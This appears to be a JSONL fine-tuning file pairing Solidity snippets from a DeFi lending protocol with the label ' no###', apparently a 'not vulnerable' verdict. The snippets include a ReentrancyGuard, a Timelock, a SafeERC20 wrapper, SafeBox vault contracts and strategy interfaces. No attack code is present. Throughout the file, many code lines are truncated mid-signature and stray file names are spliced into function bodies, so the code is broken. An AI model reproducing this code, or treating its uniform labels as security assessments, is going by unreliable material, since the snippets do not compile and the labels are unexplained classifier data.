\n function getUnderlyingPrice(address cToken) external view returns (uint) { \n address token = ICTokenInterface(cToken).underlying(); \n int price = getPrice(token); \n require(price >= 0, 'price to lower'); \n return uint(price).mul(uint(1e18).div(1e8)); \n } \n}\n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n/** \n * @dev Contract module that helps prevent reentrant calls to a function. \n * \n * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier \n * available, which can be applied to functions to make sure there are no nested \n * (reentrant) calls to them. \n * \n * Note that because there is a single `nonReentrant` guard, functions marked as \n * `nonReentrant` may not call one another. This can be worked around by making \n * those functions `private`, and then adding `external` `nonReentrant` entry \n * points to them. \n * \n * TIP: If you would like to learn more about reentrancy and alternative ways \n * to protect against it, check out our blog post \n * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul]. \n */ \nabstract contract ReentrancyGuardUpgradeable is Initializable { \n // Booleans are more expensive than uint256 or any type that takes up a full \n // word because each write operation emits an extra SLOAD to first read the \n // slot's contents, replace the bits taken up by the boolean, and then write \n // back. This is the compiler's defense against contract upgrades and \n // pointer aliasing, and it cannot be disabled. \n \n // The values being non-zero value makes deployment a bit more expensive, \n // but in exchange the refund on every call to nonReentrant will be lower in \n // amount. Since refunds are capped to a percentage of the total \n // transaction's gas, it is best to keep them low in cases like this one, to \n // increase the likelihood of the full refund coming into effect. \n uint256 private constant _NOT_ENTERED = 1; \n uint256 private constant _ENTERED = 2; \n \n uint256 private _status; \n \n function __ReentrancyGuard_init() internal initializer { \n __ReentrancyGuard_init_unchained(); \n } \n \n function __ReentrancyGuard_init_unchained() internal initializer { \n _status = _NOT_ENTERED; \n } \n \n /** \n * @dev Prevents a contract from calling itself, directly or indirectly. \n * Calling a `nonReentrant` function from another `nonReentrant` \n * function is not supported. It is possible to prevent this from happening \n * by making the `nonReentrant` function external, and make it call a \n * `private` function that does the actual work. \n */ \n modifier nonReentrant() { \n // On the first call to nonReentrant, _notEntered will be true \n require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\"); \n \n // Any calls to nonReentrant after this point will fail \n _status = _ENTERED; \n \n _; \n \n // By storing the original value once again, a refund is triggered (see \n // https://eips.ethereum.org/EIPS/eip-2200) \n _status = _NOT_ENTERED; \n } \n uint256[49] private __gap; \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface ISafeBox { \n \n function bank() external view returns(address); \n \n function token() external view returns(address); \n \n function getSource() external view returns (string memory); \n \n function supplyRatePerBlock() external view returns (uint256); \n function borrowRatePerBlock() external view returns (uint256); \n \n function getBorrowInfo(uint256 _bid) external view \n returns (address owner, uint256 amount, address strategy, uint256 pid); \n function getBorrowId(address _strategy, uint256 _pid, address _account) external view returns (ui\n function getBorrowId(address _strategy, uint256 _pid, address _account, bool _add) external retur\n function getDepositTotal() external view returns (uint256); \n function getBorrowTotal() external view returns (uint256); \n // function getBorrowAmount(address _account) external view returns (uint256 value); \n function getBaseTokenPerLPToken() external view returns (uint256); \n \n function deposit(uint256 _value) external; \n function withdraw(uint256 _value) external; \n \n function emergencyWithdraw() external; \n function emergencyRepay(uint256 _bid) external; \n \n function borrowInfoLength() external view returns (uint256); \n \n function borrow(uint256 _bid, uint256 _value, address _to) external; \n function repay(uint256 _bid, uint256 _value) external; \n function claim(uint256 _tTokenAmount) external; \n \n function update() external; \n function mintDonate(uint256 _value) external; \n \n function pendingSupplyAmount(address _account) external view returns (uint256 value); \n function pendingBorrowAmount(uint256 _bid) external view returns (uint256 value); \n function pendingBorrowRewards(uint256 _bid) external view returns (uint256 value); \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface ICompActionTrigger { \n function getCATPoolInfo(uint256 _pid) external view \n returns (address lpToken, uint256 allocRate, uint256 totalPoints, uint256 totalAmount); \n function getCATUserAmount(uint256 _pid, address _account) external view \n returns (uint256 points); \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n \ninterface IActionPools { \n \n function getPoolInfo(uint256 _pid) external view \n returns (address callFrom, uint256 callId, address rewardToken); \n function mintRewards(uint256 _callId) external; \n function getPoolIndex(address _callFrom, uint256 _callId) external view returns (uint256[] memory\n \n function onAcionIn(uint256 _callId, address _account, uint256 _fromAmount, uint256 _toAmount) ext\n function onAcionOut(uint256 _callId, address _account, uint256 _fromAmount, uint256 _toAmount) ex\n function onAcionClaim(uint256 _callId, address _account) external; \n function onAcionEmergency(uint256 _callId, address _account) external; \n function onAcionUpdate(uint256 _callId) external; \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n \nlibrary TenMath { \n using SafeMathUpgradeable for uint256; \n \n function min(uint256 v1, uint256 v2) public pure returns (uint256 vr) { \n vr = v1 > v2 ? v2 : v1; \n } \n \n function safeSub(uint256 v1, uint256 v2) internal pure returns (uint256 vr) { \n vr = v1 > v2 ? v1.sub(v2) : 0; \n } \n \n // implementation from https://github.com/Uniswap/uniswap-lib/commit/99f3f28770640ba1bb1ff460ac7c52\n // original implementation: https://github.com/abdk-consulting/abdk-libraries-solidity/blob/master/A\n function sqrt(uint256 x) internal pure returns (uint256) { \n if (x == 0) return 0; \n uint256 xx = x; \n uint256 r = 1; \n \n if (xx >= 0x100000000000000000000000000000000) { \n xx >>= 128; \n r <<= 64; \n } \n \n if (xx >= 0x10000000000000000) { \n xx >>= 64; \n r <<= 32; \n } \n if (xx >= 0x100000000) { \n xx >>= 32; \n r <<= 16; \n } \n if (xx >= 0x10000) { \n xx >>= 16; \n r <<= 8; \n } \n if (xx >= 0x100) { \n xx >>= 8; \n r <<= 4; \n } \n if (xx >= 0x10) { \n xx >>= 4; \n r <<= 2; \n } \n if (xx >= 0x8) { \n r <<= 1; \n } \n \n r = (r + x / r) >> 1; \n r = (r + x / r) >> 1; \n r = (r + x / r) >> 1; \n r = (r + x / r) >> 1; \n r = (r + x / r) >> 1; \n r = (r + x / r) >> 1; \n r = (r + x / r) >> 1; // Seven iterations should be enough \n uint256 r1 = x / r; \n return (r < r1 ? r : r1); \n } \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface IErc20Interface { \n \n /*** User Interface ***/ \n function underlying() external view returns (address); \n \n function mint(uint mintAmount) external returns (uint); // \n function redeem(uint redeemTokens) external returns (uint); \n function redeemUnderlying(uint redeemAmount) external returns (uint); \n function borrow(uint borrowAmount) external returns (uint); \n function repayBorrow(uint repayAmount) external returns (uint); \n // function repayBorrowBehalf(address borrower, uint repayAmount) external returns (uint); \n // function liquidateBorrow(address borrower, uint repayAmount, CTokenInterface cTokenCollateral) \n \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n \n \n// Safebox vault, deposit, withdrawal, borrowing, repayment \ncontract SafeBoxFoxCTokenImpl is ERC20Upgradeable { \n using SafeMathUpgradeable for uint256; \n using SafeERC20Upgradeable for IERC20Upgradeable; \n \n IErc20Interface public eToken; \n ICTokenInterface public cToken; \n \n function __SafeBoxFoxCTokenImpl__init(address _cToken) public initializer { \n __ERC20_init(string(abi.encodePacked(\"d \", ERC20Upgradeable(IErc20Interface(_cToken).underlyi\n string(abi.encodePacked(\"d\", ERC20Upgradeable(IErc20Interface(_cToken).underlying()).symb\n _setupDecimals(ERC20Upgradeable(_cToken).decimals()); \n eToken = IErc20Interface(_cToken); \n cToken = ICTokenInterface(_cToken); \n require(cToken.isCToken(), 'not ctoken address'); \n IERC20Upgradeable(baseToken()).approve(_cToken, uint256(-1)); \n } \n \n function baseToken() public virtual view returns (address) { \n return eToken.underlying(); \n } \n \n function ctokenSupplyRatePerBlock() public virtual view returns (uint256) { \n return cToken.supplyRatePerBlock(); \n } \n \n function ctokenBorrowRatePerBlock() public virtual view returns (uint256) { \n return cToken.borrowRatePerBlock(); \n } \n \n function call_balanceOf(address _token, address _account) public virtual view returns (uint256 ba\n balance = IERC20Upgradeable(_token).balanceOf(_account); \n } \n \n function call_balanceOfCToken_this() public virtual view returns (uint256 balance) { \n balance = call_balanceOf(address(cToken), address(this)); \n } \n \n function call_balanceOfBaseToken_this() public virtual returns (uint256) { \n return call_balanceOfCToken_this().mul(cToken.exchangeRateCurrent()).div(1e18); \n } \n \n function call_borrowBalanceCurrent_this() public virtual returns (uint256) { \n return cToken.borrowBalanceCurrent(address(this)); \n } \n \n function getBaseTokenPerCToken() public virtual view returns (uint256) { \n return cToken.exchangeRateStored(); \n } \n \n // deposit \n function ctokenDeposit(uint256 _value) internal virtual returns (uint256 lpAmount) { \n uint256 cBalanceBefore = call_balanceOf(address(cToken), address(this)); \n require(eToken.mint(uint256(_value)) == 0, 'deposit token error'); \n uint256 cBalanceAfter = call_balanceOf(address(cToken), address(this)); \n lpAmount = cBalanceAfter.sub(cBalanceBefore); \n } \n \n function ctokenWithdraw(uint256 _lpAmount) internal virtual returns (uint256 value) { \n uint256 cBalanceBefore = call_balanceOf(baseToken(), address(this)); \n require(eToken.redeem(_lpAmount) == 0, 'withdraw supply ctoken error'); \n uint256 cBalanceAfter = call_balanceOf(baseToken(), address(this)); \n value = cBalanceAfter.sub(cBalanceBefore); \n } \n \n function ctokenClaim(uint256 _lpAmount) internal virtual returns (uint256 value) { \n value = ctokenWithdraw(_lpAmount); \n } \n \n function ctokenBorrow(uint256 _value) internal virtual returns (uint256 value) { \n uint256 cBalanceBefore = call_balanceOf(baseToken(), address(this)); \n require(eToken.borrow(_value) == 0, 'borrow ubalance error'); \n uint256 cBalanceAfter = call_balanceOf(baseToken(), address(this)); \n value = cBalanceAfter.sub(cBalanceBefore); \n } \n \n function ctokenRepayBorrow(uint256 _value) internal virtual { \n require(eToken.repayBorrow(_value) == 0, 'repayBorrow ubalance error'); \n } \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n \n \n \n \n// Distribution of BOO Compound token \ncontract SafeBoxFox is SafeBoxFoxCToken { \n using SafeMathUpgradeable for uint256; \n using SafeERC20Upgradeable for IERC20Upgradeable; \n \n IERC20Upgradeable public REWARDS_TOKEN; \n \n uint256 public lastRewardsTokenBlock; // rewards update \n \n address public actionPoolRewards; // address for action pool \n uint256 public poolDepositId; // poolid of depositor s token rewards in action pool\n uint256 public poolBorrowId; // poolid of borrower s token rewards in action pool \n \n uint256 public REWARDS_DEPOSIT_CALLID; // depositinfo callid for action callback \n uint256 public REWARDS_BORROW_CALLID; // borrowinfo callid for comp action callback \n \n event SetRewardsDepositPool(address _actionPoolRewards, uint256 _piddeposit); \n event SetRewardsBorrowPool(address _compActionPool, uint256 _pidborrow); \n \n function initialize(address _bank, address _cToken, address _devAddr) public initializer { \n __Ownable_init(); \n \n __SafeBoxFoxCToken_init(_bank, _cToken, _devAddr); \n \n REWARDS_TOKEN = IERC20Upgradeable(0); \n REWARDS_DEPOSIT_CALLID = 16; \n REWARDS_BORROW_CALLID = 18; \n } \n \n function update() public virtual override { \n _update(); \n updatetoken(); \n } \n \n // mint rewards for supplies to action pools \n function setRewardsDepositPool(address _actionPoolRewards, uint256 _piddeposit) public onlyOwner \n actionPoolRewards = _actionPoolRewards; \n poolDepositId = _piddeposit; \n emit SetRewardsDepositPool(_actionPoolRewards, _piddeposit); \n } \n \n // mint rewards for borrows to comp action pools \n function setRewardsBorrowPool(uint256 _pidborrow) public onlyOwner { \n _checkActionPool(compActionPool, _pidborrow, REWARDS_BORROW_CALLID); \n poolBorrowId = _pidborrow; \n emit SetRewardsBorrowPool(compActionPool, _pidborrow); \n } \n \n function _checkActionPool(address _actionPool, uint256 _pid, uint256 _rewardscallid) internal vie\n (address callFrom, uint256 callId, address rewardToken) \n = IActionPools(_actionPool).getPoolInfo(_pid); \n require(callFrom == address(this), 'call from error'); \n require(callId == _rewardscallid, 'callid error'); \n } \n \n function deposit(uint256 _value) external virtual override nonReentrant { \n update(); \n IERC20Upgradeable(token).safeTransferFrom(msg.sender, address(this), _value); \n _deposit(msg.sender, _value); \n } \n \n function withdraw(uint256 _tTokenAmount) external virtual override nonReentrant { \n update(); \n _withdraw(msg.sender, _tTokenAmount); \n } \n \n function borrow(uint256 _bid, uint256 _value, address _to) external virtual override onlyBank { \n update(); \n address owner = borrowInfo[_bid].owner; \nTimelock.sol\n uint256 accountBorrowPointsOld = accountBorrowPoints[owner]; \n _borrow(_bid, _value, _to); \n \n if(compActionPool != address(0) && _value > 0) { \n IActionPools(compActionPool).onAcionIn(REWARDS_BORROW_CALLID, owner, \n accountBorrowPointsOld, accountBorrowPoints[owner]); \n } \n } \n \n function repay(uint256 _bid, uint256 _value) external virtual override { \n update(); \n address owner = borrowInfo[_bid].owner; \n uint256 accountBorrowPointsOld = accountBorrowPoints[owner]; \n _repay(_bid, _value); \n \n if(compActionPool != address(0) && _value > 0) { \n IActionPools(compActionPool).onAcionOut(REWARDS_BORROW_CALLID, owner, \n accountBorrowPointsOld, accountBorrowPoints[owner]); \n } \n } \n \n function updatetoken() public { \n if(lastRewardsTokenBlock == block.number) { \n return ; \n } \n lastRewardsTokenBlock = block.number; \n } \n \n function claim(uint256 _value) external virtual override nonReentrant { \n update(); \n _claim(msg.sender, _value); \n } \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n \ncontract Timelock { \n using SafeMath for uint; \n \n event NewAdmin(address indexed newAdmin); \n event NewPendingAdmin(address indexed newPendingAdmin); \n event NewDelay(uint indexed newDelay); \n event CancelTransaction(bytes32 indexed txHash, address indexed target, uint value, string signat\n event ExecuteTransaction(bytes32 indexed txHash, address indexed target, uint value, string signa\n event QueueTransaction(bytes32 indexed txHash, address indexed target, uint value, string signatu\n \n uint public constant GRACE_PERIOD = 14 days; \n uint public constant MINIMUM_DELAY = 2 days; \n uint public constant MAXIMUM_DELAY = 30 days; \n \n address public admin; \n address public pendingAdmin; \n uint public delay; \n \n mapping (bytes32 => bool) public queuedTransactions; \n \n \n constructor(address admin_, uint delay_) public { \n require(delay_ >= MINIMUM_DELAY, \"Timelock::constructor: Delay must exceed minimum delay.\"); \n require(delay_ <= MAXIMUM_DELAY, \"Timelock::setDelay: Delay must not exceed maximum delay.\");\n \n admin = admin_; \n delay = delay_; \n } \n \n receive() external payable { } \n \n function setDelay(uint delay_) public { \n require(msg.sender == address(this), \"Timelock::setDelay: Call must come from Timelock.\"); \n require(delay_ >= MINIMUM_DELAY, \"Timelock::setDelay: Delay must exceed minimum delay.\"); \n require(delay_ <= MAXIMUM_DELAY, \"Timelock::setDelay: Delay must not exceed maximum delay.\");\n delay = delay_; \n \n emit NewDelay(delay); \n } \n \n function acceptAdmin() public { \n require(msg.sender == pendingAdmin, \"Timelock::acceptAdmin: Call must come from pendingAdmin.\n admin = msg.sender; \n pendingAdmin = address(0); \n \n emit NewAdmin(admin); \n } \n \n function setPendingAdmin(address pendingAdmin_) public { \n require(msg.sender == address(this), \"Timelock::setPendingAdmin: Call must come from Timelock\n pendingAdmin = pendingAdmin_; \n \n emit NewPendingAdmin(pendingAdmin); \n } \n \n function queueTransaction(address target, uint value, string memory signature, bytes memory data, \n require(msg.sender == admin, \"Timelock::queueTransaction: Call must come from admin.\"); \n require(eta >= getBlockTimestamp().add(delay), \"Timelock::queueTransaction: Estimated executi\n \n bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta)); \n queuedTransactions[txHash] = true; \n \n emit QueueTransaction(txHash, target, value, signature, data, eta); \n return txHash; \n } \n \n function cancelTransaction(address target, uint value, string memory signature, bytes memory data\n require(msg.sender == admin, \"Timelock::cancelTransaction: Call must come from admin.\"); \n \n bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta)); \n queuedTransactions[txHash] = false; \n \nStrategyV2PairHelper.sol\n emit CancelTransaction(txHash, target, value, signature, data, eta); \n } \n \n function executeTransaction(address target, uint value, string memory signature, bytes memory dat\n require(msg.sender == admin, \"Timelock::executeTransaction: Call must come from admin.\"); \n \n bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta)); \n require(queuedTransactions[txHash], \"Timelock::executeTransaction: Transaction hasn't been qu\n require(getBlockTimestamp() >= eta, \"Timelock::executeTransaction: Transaction hasn't surpass\n require(getBlockTimestamp() <= eta.add(GRACE_PERIOD), \"Timelock::executeTransaction: Transact\n \n queuedTransactions[txHash] = false; \n \n bytes memory callData; \n \n if (bytes(signature).length == 0) { \n callData = data; \n } else { \n callData = abi.encodePacked(bytes4(keccak256(bytes(signature))), data); \n } \n \n // solium-disable-next-line security/no-call-value \n (bool success, bytes memory returnData) = target.call{value: value}(callData); \n require(success, \"Timelock::executeTransaction: Transaction execution reverted.\"); \n \n emit ExecuteTransaction(txHash, target, value, signature, data, eta); \n \n return returnData; \n } \n \n function getBlockTimestamp() internal view returns (uint) { \n // solium-disable-next-line security/no-block-members \n return block.timestamp; \n } \n}\n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n \n/** \n * @title SafeERC20 \n * @dev Wrappers around ERC20 operations that throw on failure (when the token \n * contract returns false). Tokens that return no value (and instead revert or \n * throw on failure) are also supported, non-reverting calls are assumed to be \n * successful. \n * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract, \n * which allows you to call the safe operations as `token.safeTransfer(...)`, etc. \n */ \nlibrary SafeERC20Upgradeable { \n using SafeMathUpgradeable for uint256; \n using AddressUpgradeable for address; \n \n function safeTransfer(IERC20Upgradeable token, address to, uint256 value) internal { \n _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value)); \n } \n \n function safeTransferFrom(IERC20Upgradeable token, address from, address to, uint256 value) inter\n _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, valu\n } \n \n /** \n * @dev Deprecated. This function has issues similar to the ones found in \n * {IERC20-approve}, and its usage is discouraged. \n * \n * Whenever possible, use {safeIncreaseAllowance} and \n * {safeDecreaseAllowance} instead. \n */ \n function safeApprove(IERC20Upgradeable token, address spender, uint256 value) internal { \n // safeApprove should only be called when setting an initial allowance, \n // or when resetting it to zero. To increase and decrease it, use \n // 'safeIncreaseAllowance' and 'safeDecreaseAllowance' \n // solhint-disable-next-line max-line-length \n require((value == 0) || (token.allowance(address(this), spender) == 0), \n \"SafeERC20: approve from non-zero to non-zero allowance\" \n ); \n _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value)); \n } \n \n function safeIncreaseAllowance(IERC20Upgradeable token, address spender, uint256 value) internal \n uint256 newAllowance = token.allowance(address(this), spender).add(value); \n _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowan\n } \n \n function safeDecreaseAllowance(IERC20Upgradeable token, address spender, uint256 value) internal \n uint256 newAllowance = token.allowance(address(this), spender).sub(value, \"SafeERC20: decreas\n _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowan\n } \n \n /** \n * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxin\n * on the return value: the return value is optional (but if data is returned, it must not be fal\n * @param token The token targeted by the call. \n * @param data The call data (encoded using abi.encode or one of its variants). \n */ \n function _callOptionalReturn(IERC20Upgradeable token, bytes memory data) private { \n // We need to perform a low level call here, to bypass Solidity's return data size checking m\n // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which \n // the target address contains contract code and also asserts for success in the low-level ca\n \n bytes memory returndata = address(token).functionCall(data, \"SafeERC20: low-level call failed\n if (returndata.length > 0) { // Return data is optional \n // solhint-disable-next-line max-line-length \n require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\"); \n } \n } \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface ITenBankHall { \n function makeBorrowFrom(uint256 _pid, address _account, address _debtFrom, uint256 _value) extern\n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n \ninterface ITenBankHallV2 is ITenBankHall { \n function boxInfo(uint256 _boxid) external view returns (address); \n function boxIndex(address _boxaddr) external view returns (uint256); \n function boxlisted(address _boxaddr) external view returns (bool); \n \n function strategyInfo(uint256 _sid) external view returns (bool, address, uint256); \n function strategyIndex(address _strategy, uint256 _sid) external view returns (uint256); \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface IPriceChecker { \n function getPriceSlippage(address _lptoken) external view returns (uint256); \n function checkLPTokenPriceLimit(address _lptoken, bool _largeType) external view returns (bool); \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface IStrategyLink { \n \n event StrategyDeposit(address indexed strategy, uint256 indexed pid, address indexed user, uint25\n event StrategyBorrow(address indexed strategy, uint256 indexed pid, address indexed user, uint256 \n event StrategyWithdraw(address indexed strategy, uint256 indexed pid, address indexed user, uint2\n event StrategyLiquidation(address indexed strategy, uint256 indexed pid, address indexed user, ui\n \n function bank() external view returns(address); \n function getSource() external view returns (string memory); \n function userInfo(uint256 _pid, address _account) external view returns (uint256,uint256,address,\n function getPoolInfo(uint256 _pid) external view returns(address[] memory collateralToken, addre\n function getBorrowInfo(uint256 _pid, address _account) external view returns (address borrowFrom, \n function getBorrowAmount(uint256 _pid, address _account) external view returns (uint256 value); \n function getBorrowAmountInBaseToken(uint256 _pid, address _account) external view returns (uint25\n function getDepositAmount(uint256 _pid, address _account) external view returns (uint256 amount);\n \n function getPoolCollateralToken(uint256 _pid) external view returns (address[] memory collateralT\n function getPoollpToken(uint256 _pid) external view returns (address lpToken); \n function getBaseToken(uint256 _pid) external view returns (address baseToken); \n \n function poolLength() external view returns (uint256); \n \n function pendingRewards(uint256 _pid, address _account) external view returns (uint256 value); \n function pendingLPAmount(uint256 _pid, address _account) external view returns (uint256 value); \n \n // function massUpdatePools(uint256 _start, uint256 _end) external; \n function updatePool(uint256 _pid, uint256 _desirePrice, uint256 _slippage) external; \n \n function deposit(uint256 _pid, address _account, address _debtFrom, uint256 _bAmount, uint256 _de\n function depositLPToken(uint256 _pid, address _account, address _debtFrom, uint256 _bAmount, uint\n \n function withdraw(uint256 _pid, address _account, uint256 _rate, address _toToken, uint256 _desir\n function withdrawLPToken(uint256 _pid, address _account, uint256 _rate, uint256 _desirePrice, uin\n \n function emergencyWithdraw(uint256 _pid, address _account, uint256 _desirePrice, uint256 _slippag\n \n function liquidation(uint256 _pid, address _account, address _hunter, uint256 _maxDebt) external;\n function repayBorrow(uint256 _pid, address _account, uint256 _rate, bool _force) external; \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n \ninterface IStrategyV2Pair is IStrategyLink { \n \n event AddPool(uint256 _pid, uint256 _poolId, address lpToken, address _baseToken); \n event SetMiniRewardAmount(uint256 _pid, uint256 _miniRewardAmount); \n event SetPoolImpl(address _oldv, address _new); \n event SetComponents(address _compActionPool, address _buyback, address _priceChecker, address _co\n event SetPoolConfig(uint256 _pid, string _key, uint256 _value); \n \n event StrategyBorrow2(address indexed strategy, uint256 indexed pid, address user, address indexe\n event StrategyRepayBorrow2(address indexed strategy, uint256 indexed pid, address user, address i\n event StrategyLiquidation2(address indexed strategy, uint256 indexed pid, address user, uint256 l\n \n function getBorrowInfo(uint256 _pid, address _account, uint256 _bindex) \n external view returns (address borrowFrom, uint256 bid, uint256 amount); \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface IStrategyV2PairHelper { \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n \nlibrary TenMath { \n using SafeMathUpgradeable for uint256; \n \n function min(uint256 v1, uint256 v2) public pure returns (uint256 vr) { \n vr = v1 > v2 ? v2 : v1; \n } \n \n function safeSub(uint256 v1, uint256 v2) internal pure returns (uint256 vr) { \n vr = v1 > v2 ? v1.sub(v2) : 0; \n } \n \n // implementation from https://github.com/Uniswap/uniswap-lib/commit/99f3f28770640ba1bb1ff460ac7c52\n // original implementation: https://github.com/abdk-consulting/abdk-libraries-solidity/blob/master/\n function sqrt(uint256 x) internal pure returns (uint256) { \n if (x == 0) return 0; \n uint256 xx = x; \n uint256 r = 1; \n \n if (xx >= 0x100000000000000000000000000000000) { \n xx >>= 128; \n r <<= 64; \n } \n \n if (xx >= 0x10000000000000000) { \n xx >>= 64; \n r <<= 32; \n } \n if (xx >= 0x100000000) { \n xx >>= 32; \n r <<= 16; \n } \n if (xx >= 0x10000) { \n xx >>= 16; \n r <<= 8; \n } \n if (xx >= 0x100) { \n xx >>= 8; \n r <<= 4; \n } \n if (xx >= 0x10) { \n xx >>= 4; \n r <<= 2; \n } \n if (xx >= 0x8) { \n r <<= 1; \n } \n \n r = (r + x / r) >> 1; \n r = (r + x / r) >> 1; \n r = (r + x / r) >> 1; \n r = (r + x / r) >> 1; \n r = (r + x / r) >> 1; \n r = (r + x / r) >> 1; \n r = (r + x / r) >> 1; // Seven iterations should be enough \n uint256 r1 = x / r; \n return (r < r1 ? r : r1); \n } \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n \ninterface IStrategyConfig { \n // event \n event SetFeeGather(address _feeGatherOld, address _feeGather); \n event SetReservedGather(address _old, address _new); \n event SetBorrowFactor(address _strategy, uint256 _poolid, uint256 _borrowFactor); \n event SetLiquidationFactor(address _strategy, uint256 _poolid, uint256 _liquidationFactor); \n event SetFarmPoolFactor(address _strategy, uint256 _poolid, uint256 _farmPoolFactor); \n event SetDepositFee(address _strategy, uint256 _poolid, uint256 _depositFee); \n event SetWithdrawFee(address _strategy, uint256 _poolid, uint256 _withdrawFee); \n event SetRefundFee(address _strategy, uint256 _poolid, uint256 _refundFee); \n event SetClaimFee(address _strategy, uint256 _poolid, uint256 _claimFee); \n event SetLiquidationFee(address _strategy, uint256 _poolid, uint256 _liquidationFee); \n \n // factor \n function getBorrowFactor(address _strategy, uint256 _poolid) external view returns (uint256); \n function setBorrowFactor(address _strategy, uint256 _poolid, uint256 _borrowFactor) external; \n \n function getLiquidationFactor(address _strategy, uint256 _poolid) external view returns (uint256)\n function setLiquidationFactor(address _strategy, uint256 _poolid, uint256 _liquidationFactor) ext\n \n function getFarmPoolFactor(address _strategy, uint256 _poolid) external view returns (uint256 val\n function setFarmPoolFactor(address _strategy, uint256 _poolid, uint256 _farmPoolFactor) external;\n \n // fee manager \n function getDepositFee(address _strategy, uint256 _poolid) external view returns (address, uint25\n function setDepositFee(address _strategy, uint256 _poolid, uint256 _depositFee) external; \n \n function getWithdrawFee(address _strategy, uint256 _poolid) external view returns (address, uint2\n function setWithdrawFee(address _strategy, uint256 _poolid, uint256 _withdrawFee) external; \n \n function getRefundFee(address _strategy, uint256 _poolid) external view returns (address, uint256\n function setRefundFee(address _strategy, uint256 _poolid, uint256 _refundFee) external; \n \n function getClaimFee(address _strategy, uint256 _poolid) external view returns (address, uint256)\n function setClaimFee(address _strategy, uint256 _poolid, uint256 _claimFee) external; \n \n function getLiquidationFee(address _strategy, uint256 _poolid) external view returns (address, ui\n function setLiquidationFee(address _strategy, uint256 _poolid, uint256 _liquidationFee) external;\n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface IStrategyV2SwapPool { \n \n function setStrategy(address _strategy) external; \n \n // get strategy \n function getName() external view returns (string memory); \n \n // swap functions \n function getPair(address _t0, address _t1) external view returns (address pairs); \n function getReserves(address _lpToken) external view returns (uint256 a, uint256 b); \n function getToken01(address _pairs) external view returns (address token0, address token1); \n function getAmountOut(address _tokenIn, address _tokenOut, uint256 _amountOut) external view retu\n function getAmountIn(address _tokenIn, uint256 _amountIn, address _tokenOut) external view return\n function getLPTokenAmountInBaseToken(address _lpToken, uint256 _lpTokenAmount, address _baseToken\n function swapTokenTo(address _tokenIn, uint256 _amountIn, address _tokenOut, address _toAddress) \n \n function optimalBorrowAmount(address _lpToken, uint256 _amount0, uint256 _amount1) external view \n function optimalDepositAmount(address lpToken, uint amtA, uint amtB) external view returns (uint \n \n // pool functions \n function getDepositToken(uint256 _poolId) external view returns (address lpToken); \n function getRewardToken(uint256 _poolId) external view returns (address rewardToken); \n function getPending(uint256 _poolId) external view returns (uint256 rewards); \n function deposit(uint256 _poolId, bool _autoPool) external returns (uint256 liquidity); \n function withdraw(uint256 _poolId, uint256 _liquidity, bool _autoPool) external returns (uint256 \n function claim(uint256 _poolId) external returns (uint256 rewards); \n function extraRewards() external returns (address token, uint256 rewards); \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
